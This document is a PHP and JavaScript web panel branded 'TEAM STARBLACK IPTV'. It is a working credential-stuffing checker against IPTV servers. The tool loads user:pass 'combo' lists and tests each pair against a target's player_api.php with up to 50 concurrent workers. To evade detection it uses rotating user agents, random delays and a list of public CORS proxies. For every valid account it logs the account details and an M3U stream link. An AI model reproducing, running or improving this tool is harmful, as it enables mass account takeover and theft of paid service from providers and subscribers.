<?php
require_once 'db.php';
requireLogin();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TEAM STARBLACK IPTV</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
        
        :root {
            --accent-start: #a855f7;
            --accent-end: #22d3ee;
            --accent-gradient: linear-gradient(180deg, var(--accent-start), var(--accent-end));
            --dark-bg: #0f1117;
            --input-bg: #111;
        }
        
        body {
            background: var(--dark-bg);
            color: #e6f3ff;
            font-family: 'Orbitron', monospace;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .glass-panel {
            background: rgba(18, 25, 40, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(90, 140, 255, 0.15);
            border-radius: 2.5rem;
            padding: 2rem;
            max-width: 900px;
            margin: 0 auto;
            box-shadow: 0 0 30px rgba(168,85,247,.3);
        }
        
        h1 {
            text-align: center;
            font-size: 2rem;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            padding: 12px 20px;
            margin: 0 0 20px 0;
            animation: neonFlicker 1.5s infinite;
            border: 2px solid transparent;
            border-radius: 15px;
            position: relative;
        }
        
        h1::before {
            content: "";
            position: absolute;
            inset: 0;
            border-radius: 15px;
            padding: 2px;
            background: linear-gradient(270deg, #a855f7, #22d3ee, #a855f7);
            background-size: 300% 300%;
            animation: borderFlow 8s linear infinite;
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
        }
        
        @keyframes neonFlicker {
            0%, 18%, 22%, 25%, 53%, 57%, 100% {
                text-shadow: 0 0 8px rgba(168,85,247,.7), 0 0 14px rgba(34,211,238,.7);
            }
            20%, 24%, 55% {
                text-shadow: none;
            }
        }
        
        @keyframes borderFlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .header-sb {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            flex-wrap: wrap;
            gap: 1rem;
        }
        
        .user-info {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .badge-user {
            background: #1e2b4a;
            border-radius: 30px;
            padding: 0.5rem 1.2rem;
            border: 1px solid #3f518b;
            color: #aec9ff;
            box-shadow: 0 0 10px rgba(168,85,247,.3);
        }
        
        .logout-btn, .admin-btn {
            padding: 0.5rem 1.2rem;
            border-radius: 40px;
            text-decoration: none;
            font-size: 0.9rem;
            transition: 0.15s;
        }
        
        .logout-btn {
            background: #2d1f2f;
            border: 1px solid #b3668c;
            color: #ffc2d9;
        }
        
        .logout-btn:hover {
            background: #4d2d3f;
            box-shadow: 0 0 15px rgba(255,100,150,.5);
        }
        
        .admin-btn {
            background: #1f3a4d;
            border: 1px solid #66a3ff;
            color: #b6dcff;
        }
        
        .admin-btn:hover {
            background: #2a4a6d;
            box-shadow: 0 0 15px rgba(100,150,255,.5);
        }
        
        .control-panel {
            background: #0f172bb3;
            border-radius: 2rem;
            padding: 1.8rem;
            margin-bottom: 2rem;
            border: 1px solid #2d3d66;
            box-shadow: 0 0 20px rgba(168,85,247,.3);
        }
        
        .input-group {
            margin-bottom: 1.5rem;
        }
        
        .input-group label {
            display: block;
            color: #90a9d9;
            font-size: 0.8rem;
            text-transform: uppercase;
            margin-bottom: 0.4rem;
            letter-spacing: 1px;
        }
        
        .input-wrapper {
            background: #02061780;
            border-radius: 60px;
            border: 1px solid #364a76;
            padding: 0 6px;
            transition: all 0.3s;
        }
        
        .input-wrapper:focus-within {
            border-color: #a855f7;
            box-shadow: 0 0 15px rgba(168,85,247,.5);
        }
        
        .input-wrapper input {
            background: transparent;
            border: none;
            padding: 0.9rem 1rem;
            color: white;
            width: 100%;
            font-family: 'Orbitron', monospace;
            font-size: 1rem;
        }
        
        .input-wrapper input:focus {
            outline: none;
        }
        
        .file-area {
            margin-bottom: 1.5rem;
        }
        
        .file-input-row {
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .custom-file-upload {
            background: #111c31;
            border: 1px dashed #4f6da3;
            border-radius: 60px;
            padding: 0.8rem 1.5rem;
            cursor: pointer;
            color: #bfd2ff;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            transition: 0.15s;
            position: relative;
            overflow: hidden;
        }
        
        .custom-file-upload::before {
            content: "";
            position: absolute;
            top: 0;
            right: -75%;
            width: 50%;
            height: 100%;
            background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
            transform: skewX(-20deg);
            animation: shineMove 6s infinite;
        }
        
        @keyframes shineMove {
            0% { right: -75%; }
            50% { right: 125%; }
            100% { right: -75%; }
        }
        
        .custom-file-upload:hover {
            background: #1a2945;
            border-color: #7f9ee0;
        }
        
        .file-info {
            font-size: 0.85rem;
            color: #95abda;
        }
        
        .opts {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin: 15px 0;
        }
        
        .cors-row {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .cors-row label {
            color: #90a9d9;
            cursor: pointer;
        }
        
        .cors-row input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #a855f7;
        }
        
        .action-buttons {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 20px 0;
        }
        
        .btn-primary {
            background: var(--accent-gradient);
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.9rem 2.2rem;
            border-radius: 60px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.15s;
            font-family: 'Orbitron', monospace;
            box-shadow: 0 0 15px rgba(168,85,247,.5);
        }
        
        .btn-primary:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 0 22px rgba(168,85,247,.8), 0 0 28px rgba(34,211,238,.6);
        }
        
        .btn-primary:disabled {
            opacity: 0.45;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background: transparent;
            border: 1px solid #4f6294;
            color: #c1d2ff;
            padding: 0.7rem 1.8rem;
            border-radius: 60px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            transition: 0.15s;
        }
        
        .btn-secondary:hover:not(:disabled) {
            background: #1d2b4a;
            color: white;
            border-color: #7089cc;
        }
        
        .btn-secondary:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        
        .stats-check {
            display: flex;
            gap: 2rem;
            flex-wrap: wrap;
            margin-top: 1rem;
        }
        
        .stat-check-item {
            background: #101b2c;
            border-radius: 40px;
            padding: 0.5rem 1.2rem;
            border: 1px solid #374e7c;
            box-shadow: 0 0 10px rgba(168,85,247,.2);
        }
        
        .progress-container {
            margin-top: 20px;
            border: 2px solid transparent;
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
            background: #0b1020;
        }
        
        .progress-bar {
            background: #020617;
            border-radius: 10px;
            height: 20px;
            overflow: hidden;
        }
        
        .progress-bar-fill {
            background: var(--accent-gradient);
            height: 100%;
            width: 0%;
            transition: width .3s ease;
        }
        
        .progress-text {
            margin-top: 8px;
            font-size: 14px;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .current-combo {
            margin-top: 5px;
            font-size: 13px;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            min-height: 22px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .yellow-hit {
            color: yellow;
            text-shadow: 0 0 8px yellow, 0 0 15px yellow;
            font-weight: 700;
        }
        
        #hitsContainer {
            margin-top: 15px;
            background: #0b1020;
            padding: 15px;
            border-radius: 15px;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #25375b;
            box-shadow: inset 0 0 20px rgba(0,0,0,.5);
        }
        
        .hit-block {
            border: 2px solid transparent;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 12px;
            background: #000;
            box-shadow: 0 0 12px rgba(168,85,247,.6), 0 0 18px rgba(34,211,238,.45);
            transition: all .3s;
            position: relative;
            overflow: hidden;
        }
        
        .hit-block::before {
            content: "";
            position: absolute;
            bottom: -75%;
            right: -75%;
            width: 80%;
            height: 80%;
            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.5), transparent);
            transform: skewX(-20deg);
            animation: shineDiagonal 6s ease-in-out infinite;
            pointer-events: none;
        }
        
        @keyframes shineDiagonal {
            0% { bottom: -75%; right: -75%; opacity: 0; }
            10% { opacity: 1; }
            50% { bottom: 125%; right: 125%; opacity: 1; }
            60% { opacity: 0; }
            100% { bottom: 125%; right: 125%; opacity: 0; }
        }
        
        .hit-block:hover {
            background: #1a1025;
            box-shadow: 0 0 20px rgba(168,85,247,.8), 0 0 28px rgba(34,211,238,.6);
        }
        
        .hit-header {
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 1.1rem;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .hit-content {
            white-space: pre-wrap;
            color: #cfe9ff;
            font-size: 12px;
            font-family: monospace;
            line-height: 1.5;
            text-shadow: 0 0 4px rgba(34,211,238,.3);
        }
        
        .footer-credits {
            margin-top: 2rem;
            color: #7087bc;
            border-top: 1px solid #1f3055;
            padding-top: 1rem;
            text-align: center;
            font-size: 0.85rem;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .glass-panel { padding: 1rem; }
            .action-buttons { flex-direction: column; }
            .btn-primary, .btn-secondary { width: 100%; }
            .file-input-row { flex-direction: column; align-items: flex-start; }
        }
    </style>
</head>
<body>
    <div class="glass-panel">
        <h1>⚡ TEAM STARBLACK IPTV ⚡</h1>
        
        <!-- Header con usuario -->
        <div class="header-sb">
            <div></div>
            <div class="user-info">
                <span class="badge-user"><i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?></span>
                <span class="badge-user"><i class="fas fa-calendar"></i> Exp: <?php echo $_SESSION['exp_date']; ?></span>
                <?php if (isAdmin()): ?>
                    <a href="admin.php" class="admin-btn"><i class="fas fa-cog"></i> Admin</a>
                <?php endif; ?>
                <a href="logout.php" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Salir</a>
            </div>
        </div>

        <!-- Panel de control -->
        <div class="control-panel">
            <div class="input-group">
                <label><i class="fas fa-server"></i> SERVIDOR </label>
                <div class="input-wrapper">
                    <input type="text" id="hostInput" placeholder="ej: server.hack:80" value="">
                </div>
                <small style="color: #8da4cc; display: block; margin-top: 5px;">sin o con http://</small>
            </div>

            <!-- ÚNICO combo file -->
            <div class="file-area">
                <div class="file-input-row">
                    <label for="comboFile" class="custom-file-upload">
                        <i class="fas fa-cloud-upload-alt"></i> Seleccionar Combo
                    </label>
                    <input type="file" id="comboFile" accept=".txt" style="display:none;">
                    <span class="file-info" id="fileInfo"><i class="far fa-file"></i> Ningún Combo cargado</span>
                </div>
                <small style="color: #8da4cc; display: block; margin-top: 5px;">
                    Formato: user:pass
                </small>
            </div>

            <div class="input-group">
                <label><i class="fas fa-tachometer-alt"></i> Conexiones (1-50)</label>
                <div class="input-wrapper">
                    <input type="number" id="concurrencyInput" min="1" max="50" value="25">
                </div>
            </div>

            <!-- Opciones -->
            <div class="opts">
                <div class="cors-row">
                    <label>
                        <input type="checkbox" id="useCors" checked> Usar proxy
                    </label>
                </div>
                <div class="cors-row">
                    <label>
                        <input type="checkbox" id="soundToggle" checked> Sonido
                    </label>
                </div>
                <div class="cors-row">
                    <label>
                        <input type="checkbox" id="autoDownload" checked> Descargar automáticamente
                    </label>
                </div>
            </div>

            <!-- Botones -->
            <div class="action-buttons">
                <button class="btn-primary" id="startBtn" disabled>
                    <i class="fas fa-play"></i> INICIAR
                </button>
                <button class="btn-secondary" id="stopBtn" disabled>
                    <i class="fas fa-stop"></i> DETENER
                </button>
                <button class="btn-secondary" id="saveBtn" disabled>
                    <i class="fas fa-download"></i> GUARDAR
                </button>
                <button class="btn-secondary" id="clearBtn">
                    <i class="fas fa-trash"></i> LIMPIAR
                </button>
            </div>

            <!-- Stats rápidas -->
            <div class="stats-check">
                <div class="stat-check-item">
                    <i class="fas fa-check-circle" style="color:#6aff8a;"></i> 
                    <span id="hitCount">0</span> Hits
                </div>
                <div class="stat-check-item">
                    <i class="fas fa-times-circle" style="color:#ff7c7c;"></i> 
                    <span id="failCount">0</span> Fails
                </div>
                <div class="stat-check-item">
                    <i class="fas fa-hourglass-half"></i> 
                    <span id="pendingCount">0</span> Pendientes
                </div>
            </div>
        </div>

        <!-- Barra de progreso ÚNICA -->
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">Esperando inicio...</div>
            <div class="current-combo" id="currentCombo">Usuario actual: -</div>
        </div>

        <!-- Contenedor de hits (resultados) -->
        <div id="hitsContainer"></div>

        <!-- Footer -->
        <div class="footer-credits">
            <span>© 2026 Team Starblack. Todos los derechos reservados. By @hacker056</span>
        </div>
    </div>

    <script>
    (function() {
        // Elementos DOM
        const hostInput = document.getElementById('hostInput');
        const concurrencyInput = document.getElementById('concurrencyInput');
        const comboFile = document.getElementById('comboFile');
        const fileInfo = document.getElementById('fileInfo');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const saveBtn = document.getElementById('saveBtn');
        const clearBtn = document.getElementById('clearBtn');
        const useCors = document.getElementById('useCors');
        const soundToggle = document.getElementById('soundToggle');
        const autoDownload = document.getElementById('autoDownload');
        
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const currentCombo = document.getElementById('currentCombo');
        
        const hitsContainer = document.getElementById('hitsContainer');
        const hitSpan = document.getElementById('hitCount');
        const failSpan = document.getElementById('failCount');
        const pendingSpan = document.getElementById('pendingCount');

        // Estado
        let combos = [];
        let isRunning = false;
        let stopRequested = false;
        let hits = [];
        let fails = 0;
        
        // Proxies CORS (igual que el HTML funcional)
        const CORS_PROXIES = [
            'https://cors.isomorphic-git.org/{url}',
            'https://thingproxy.freeboard.io/fetch/{url}',
            'https://api.allorigins.win/raw?url={url}',
            'https://corsproxy.io/?{url}',
            'https://api.codetabs.com/v1/proxy/?quest={url}',
            'https://yacdn.org/proxy/{url}',
            'https://api.s0n1c.org/cors?url={url}'
        ];
        
        // Audio
        let audioCtx = null;
        
        function unlockAudio() {
            if (audioCtx) return;
            try {
                const Ctx = window.AudioContext || window.webkitAudioContext;
                if (!Ctx) return;
                audioCtx = new Ctx();
            } catch(_) {}
        }
        
        function playHitSound() {
            if (!soundToggle.checked || !audioCtx) return;
            try {
                const o = audioCtx.createOscillator();
                const g = audioCtx.createGain();
                o.type = 'sine';
                o.frequency.setValueAtTime(880, audioCtx.currentTime);
                g.gain.setValueAtTime(0.2, audioCtx.currentTime);
                g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.2);
                o.connect(g);
                g.connect(audioCtx.destination);
                o.start();
                o.stop(audioCtx.currentTime + 0.2);
                if (navigator.vibrate) navigator.vibrate(80);
            } catch(_) {}
        }
        
        // Utilidades (igual que el HTML funcional)
        function limpiarHost(host) {
            return host.replace(/^https?:\/\//, '').trim();
        }
        
        // EXTRACCIÓN INTELIGENTE - igual que el HTML funcional
        function extractCombo(line) {
            if (!line) return null;
            // Normalizar Unicode y espacios
            let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
            // Buscar patrón user:pass permitiendo cualquier caracter
            const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
            if (!m) return null;
            const user = m[1].trim();
            const pass = m[2].trim();
            return user && pass ? [user, pass] : null;
        }
        
        function randomUA() {
            const uas = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
            ];
            return uas[Math.floor(Math.random() * uas.length)];
        }
        
        function updateStats() {
            hitSpan.innerText = hits.length;
            failSpan.innerText = fails;
            pendingSpan.innerText = combos.length;
        }
        
        function formatDate(timestamp) {
            if (!timestamp) return 'N/A';
            const d = new Date(parseInt(timestamp) * 1000);
            return d.toLocaleDateString('es-ES', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });
        }
        
        // Resumen de categorías (igual que HTML funcional)
        function summarizeCategories(cats, limit = 40) {
            if (!Array.isArray(cats) || !cats.length) return '• No disponibles';
            const names = cats.map(c => c.category_name || c.name || '').filter(Boolean);
            const shown = names.slice(0, limit);
            const lines = shown.map(n => `• ${n}`);
            if (names.length > limit) {
                lines.push(`• ... (+${names.length - limit} más)`);
            }
            return lines.join('\n');
        }
        
        // Mostrar hit en el contenedor (formato mejorado)
        function mostrarHit(hit) {
            const div = document.createElement('div');
            div.className = 'hit-block';
            
            const header = document.createElement('div');
            header.className = 'hit-header';
            header.innerHTML = `<i class="fas fa-check-circle" style="color:#6aff8a;"></i> ${hit.user}:${hit.pass}`;
            
            const content = document.createElement('pre');
            content.className = 'hit-content';
            content.textContent = hit.texto;
            
            div.appendChild(header);
            div.appendChild(content);
            hitsContainer.prepend(div);
            
            playHitSound();
            updateStats();
        }
        
        // Fetch con timeout y CORS (igual que HTML funcional)
        async function fetchWithCors(url, options = {}, timeout = 7000) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
                if (useCors.checked) {
                    // Elegir proxy aleatorio
                    const proxy = CORS_PROXIES[Math.floor(Math.random() * CORS_PROXIES.length)];
                    const proxyUrl = proxy.replace('{url}', encodeURIComponent(url));
                    const res = await fetch(proxyUrl, { ...options, signal: controller.signal });
                    clearTimeout(timeoutId);
                    return res;
                } else {
                    const res = await fetch(url, { ...options, signal: controller.signal });
                    clearTimeout(timeoutId);
                    return res;
                }
            } catch (e) {
                clearTimeout(timeoutId);
                throw e;
            }
        }
        
        // Validar combo - MISMA LÓGICA QUE EL HTML FUNCIONAL
        async function validarCombo(host, combo) {
            try {
                const pair = extractCombo(combo);
                if (!pair) return null;
                const [user, pass] = pair;
                
                currentCombo.textContent = `Usuario actual: ${user}:${pass}`;
                
                // Probar con http y https
                const protocols = ['http://', 'https://'];
                let data = null;
                let usedProto = 'http://';
                
                for (const proto of protocols) {
                    try {
                        const url = `${proto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                        const res = await fetchWithCors(url, {
                            headers: { 
                                'User-Agent': randomUA(),
                                'Accept': 'application/json, text/javascript,*/*;q=0.9'
                            }
                        }, 8000);
                        
                        if (res.ok) {
                            data = await res.json();
                            usedProto = proto;
                            break;
                        }
                    } catch(_) {
                        continue;
                    }
                }
                
                if (!data) return null;
                
                // Analizar respuesta (igual que HTML funcional)
                const uinfo = data.user_info || {};
                
                // CRITERIO DE HIT: status Active o auth=1
                const isHit = (uinfo.status === 'Active') || 
                             String(uinfo.auth) === '1' || 
                             uinfo.auth === true ||
                             data.status === 'Active' ||
                             String(data.auth) === '1';
                
                if (!isHit) return null;
                
                // Obtener categorías (segunda petición)
                let liveCatsText = '• No disponibles';
                try {
                    const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
                    const catRes = await fetchWithCors(catsUrl, {}, 5000);
                    const catData = await catRes.json();
                    if (Array.isArray(catData)) {
                        liveCatsText = summarizeCategories(catData, 40);
                    }
                } catch(_) {}
                
                // Extraer todos los datos disponibles
                const port = host.includes(':') ? host.split(':')[1] : (usedProto === 'https://' ? '443' : '80');
                const hostSem = host.split(':')[0];
                
                const creada = uinfo.created_at ? 
                    new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/A';
                const expira = uinfo.exp_date ? 
                    new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/A';
                const status = uinfo.status || data.status || 'Active';
                const maxConns = uinfo.max_connections || uinfo.max_cons || 'N/A';
                const activeCons = uinfo.active_cons || uinfo.connected_cons || 'N/A';
                const timezone = uinfo.timezone || 'N/A';
                
                const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
                
                // Formato de texto mejorado (igual que HTML funcional)
                const texto = `══════════[ TEAM STARBLACK ]══════════

╭─➤  HIT ENCONTRADO
├🔸 Host ➤ ${hostSem}
├🔸 Puerto ➤ ${port}
├🔸 User ➤ ${user}
├🔸 Pass ➤ ${pass}
├🔸 Creada ➤ ${creada}
├🔸 Expira ➤ ${expira}
├🔸 Status ➤ ${status} ✅
├🔸 Max Conns ➤ ${maxConns}
├🔸 Act Conns ➤ ${activeCons}
├🔸 TimeZone ➤ ${timezone}

📺 CATEGORÍAS:
${liveCatsText}

🔗 M3U:
${link}

╰───────────────────────────────────`;
                
                return { texto, user, pass, host: hostSem };
                
            } catch (e) {
                return null;
            }
        }
        
        // Procesar scan con workers (igual que HTML funcional)
        async function processScan(host, conc) {
            let processed = 0;
            const total = combos.length;
            
            progressText.textContent = `Iniciando scan con ${conc} workers... (0/${total})`;
            progressFill.style.width = '0%';
            
            const sleep = ms => new Promise(r => setTimeout(r, ms));
            let index = 0;
            
            async function worker() {
                while (index < total && !stopRequested) {
                    const i = index++;
                    if (i >= total) break;
                    
                    const combo = combos[i];
                    const hit = await validarCombo(host, combo);
                    
                    if (hit) {
                        hits.push(hit);
                        mostrarHit(hit);
                    } else {
                        fails++;
                        updateStats();
                    }
                    
                    processed++;
                    const pct = (processed / total) * 100;
                    progressFill.style.width = pct + '%';
                    progressText.textContent = `Progreso: ${processed}/${total} (${hits.length} hits)`;
                    
                    // Delay aleatorio entre 40 y 140ms (igual que HTML funcional)
                    await sleep(40 + Math.random() * 100);
                }
            }
            
            await Promise.all(Array.from({ length: conc }, () => worker()));
            progressText.textContent += stopRequested ? ' ⏹️ DETENIDO' : ' ✅ COMPLETADO';
            currentCombo.textContent = 'Usuario actual: -';
        }
        
        // Leer archivo
        comboFile.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) {
                fileInfo.innerHTML = '<i class="far fa-file"></i> Ningún archivo cargado';
                combos = [];
                startBtn.disabled = true;
                return;
            }
            
            fileInfo.innerHTML = `<i class="fas fa-file-lines"></i> ${file.name}`;
            
            const reader = new FileReader();
            reader.onload = (e) => {
                combos = [];
                const lines = String(e.target.result).split(/\r?\n/);
                let validos = 0;
                
                for (const line of lines) {
                    const pair = extractCombo(line);
                    if (pair) {
                        combos.push(`${pair[0]}:${pair[1]}`);
                        validos++;
                    }
                }
                
                fileInfo.innerHTML += ` · ${validos} combos válidos`;
                updateStartState();
                updateStats();
            };
            reader.readAsText(file);
        });
        
        hostInput.addEventListener('input', updateStartState);
        
        function updateStartState() {
            const hasHost = !!hostInput.value.trim();
            startBtn.disabled = !(hasHost && combos.length > 0);
        }
        
        // Iniciar scan
        startBtn.addEventListener('click', async () => {
            if (isRunning) return;
            
            unlockAudio();
            if (audioCtx && audioCtx.state === 'suspended') {
                try { await audioCtx.resume(); } catch(_) {}
            }
            
            // Reset
            stopRequested = false;
            isRunning = true;
            hits = [];
            fails = 0;
            hitsContainer.innerHTML = '';
            
            startBtn.disabled = true;
            stopBtn.disabled = false;
            saveBtn.disabled = true;
            
            updateStats();
            
            const host = limpiarHost(hostInput.value);
            const conc = Math.min(50, Math.max(1, parseInt(concurrencyInput.value) || 30));
            
            await processScan(host, conc);
            
            isRunning = false;
            stopBtn.disabled = true;
            startBtn.disabled = false;
            saveBtn.disabled = false;
            
            if (autoDownload.checked && hits.length > 0) {
                guardarHits(host);
            }
        });
        
        stopBtn.addEventListener('click', () => {
            stopRequested = true;
            stopBtn.disabled = true;
        });
        
        function guardarHits(host) {
            if (hits.length === 0) return;
            
            let content = `══════════[ TEAM STARBLACK ]══════════\n`;
            content += `Host: ${host}\n`;
            content += `Total Hits: ${hits.length}\n`;
            content += `Fecha: ${new Date().toLocaleString()}\n`;
            content += `Usuario: <?php echo $_SESSION['username']; ?>\n`;
            content += `═══════════════════════════════════\n\n`;
            
            hits.forEach((hit, i) => {
                content += hit.texto;
                content += '\n\n';
            });
            
            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `hits_${host.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        saveBtn.addEventListener('click', () => {
            const host = limpiarHost(hostInput.value);
            guardarHits(host);
        });
        
        clearBtn.addEventListener('click', () => {
            if (isRunning) stopRequested = true;
            setTimeout(() => {
                combos = [];
                hits = [];
                fails = 0;
                hitsContainer.innerHTML = '';
                
                progressFill.style.width = '0%';
                progressText.textContent = 'Esperando inicio...';
                currentCombo.textContent = 'Usuario actual: -';
                
                fileInfo.innerHTML = '<i class="far fa-file"></i> Ningún archivo cargado';
                comboFile.value = '';
                
                updateStats();
                updateStartState();
            }, 100);
        });
        
        // Inicializar
        updateStartState();
        updateStats();
    })();
    </script>
</body>
</html>